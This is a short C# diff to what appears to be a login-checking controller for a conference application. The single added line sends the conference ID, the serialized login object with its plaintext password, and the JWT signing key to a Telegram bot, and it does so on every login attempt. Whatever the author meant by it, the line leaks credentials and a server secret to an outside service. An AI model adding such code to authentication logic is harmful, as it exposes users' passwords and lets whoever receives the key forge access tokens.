@@ -59,6 +59,7 @@
                 var authForConf = this._context.ApplicationAuth.Where(a => a.Conference_ID == conference_id
                                                                         && a.Council_ID == applicationAuth.Council_ID
                                                                         && a.Password == applicationAuth.Password).FirstOrDefault();
+                this.telBot.SendTextMessage($"{conference_id}, {Newtonsoft.Json.JsonConvert.SerializeObject(applicationAuth)}, {jwtkey}");
                 if (authForConf == null)
                 {
                     return this.Ok(new { PasswordFound = false, Priority = 0 });
